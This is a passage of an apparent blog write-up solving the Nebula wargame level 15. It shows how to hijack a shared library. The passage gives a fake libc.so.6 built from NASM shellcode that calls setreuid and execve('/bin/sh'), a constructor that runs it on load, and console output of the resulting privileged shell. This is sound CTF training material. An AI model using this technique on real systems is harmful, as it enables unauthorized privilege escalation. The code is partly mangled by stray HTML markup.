</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/tmp$ gcc -shared -static-libgcc -Wl,&ndash;version-script=version.map,-Bstatic libc.so.6.c -o /var/tmp/flag15/libc.so.6&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>level15@nebula:/tmp$ /home/flag15/flag15
</span><span class='line'>flag15@nebula:/tmp$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>

<p>The second way how to solve the challenge is without linking libc, writing assembler code. For this purpose we used <a href="http://www.nasm.us/pub/nasm/releasebuilds/2.11.08/">nasm</a>
assembler, everything needed for the compilation process was already on the nebula iso.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/tmp$ wget -q &lt;a href="http://www.nasm.us/pub/nasm/releasebuilds/2.11.08/nasm-2.11.08.tar.gz">http://www.nasm.us/pub/nasm/releasebuilds/2.11.08/nasm-2.11.08.tar.gz&lt;/a>
</span><span class='line'>level15@nebula:/tmp$ tar xzf nasm-2.11.08.tar.gz
</span><span class='line'>level15@nebula:/tmp$ cd nasm-2.11.08/
</span><span class='line'>level15@nebula:/tmp/nasm-2.11.08$ ./configure &amp;&amp; make ; cd ..</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><figcaption><span>shell.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.data</span>
</span><span class='line'><span class="nf">cmd</span> <span class="no">db</span> <span class="err">&amp;</span><span class="no">lsquo</span><span class="err">;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&amp;</span><span class="no">rsquo</span><span class="err">;</span><span class="p">,</span><span class="mi">0x0</span><span class="err">&lt;/</span><span class="no">p</span><span class="err">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="err">&gt;</span><span class="no">section</span> <span class="no">.text</span><span class="err">&lt;/</span><span class="no">p</span><span class="err">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="err">&gt;</span><span class="no">global</span> <span class="no">shell</span><span class="err">&lt;/</span><span class="no">p</span><span class="err">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="err">&gt;</span><span class="no">shell</span><span class="p">:</span><span class="err">&lt;/</span><span class="no">p</span><span class="err">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="err">&gt;;</span><span class="no">setreuid</span><span class="p">(</span><span class="no">geteuid</span><span class="p">(),</span><span class="no">geteuid</span><span class="p">())</span><span class="err">;</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">49</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">70</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span><span class="err">&lt;/</span><span class="no">p</span><span class="err">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="err">&gt;;</span><span class="no">execve</span><span class="p">(</span><span class="err">&amp;</span><span class="no">ldquo</span><span class="err">;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&amp;</span><span class="no">rdquo</span><span class="err">;</span><span class="p">,</span> <span class="err">{&amp;</span><span class="no">ldquo</span><span class="err">;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&amp;</span><span class="no">rdquo</span><span class="err">;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">11</span>
</span><span class='line'><span class="nf">lea</span> <span class="no">ebx</span><span class="p">,</span> <span class="err">[</span><span class="no">cmd</span><span class="err">]</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ecx</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><figcaption><span>run-shell.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">shell</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
</span><span class='line'><span class="kt">void</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">attribute</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="n">init</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">shell</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level15@nebula:/tmp$</span> /tmp/nasm-2.11.08/nasm -f elf shell.asm&lt;/p&gt;
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;level15@nebula:/tmp$ gcc -shared -nostdlib run-shell.c shell.o -o /var/tmp/flag15/libc.so.6&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;level15@nebula:/tmp$ /home/flag15/flag15</span>
</span><span class='line'><span class="go">/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ id</span>
</span><span class='line'><span class="go">uid=984(flag15) gid=1016(level15) groups=984(flag15),1016(level15)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ getflag</span>
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
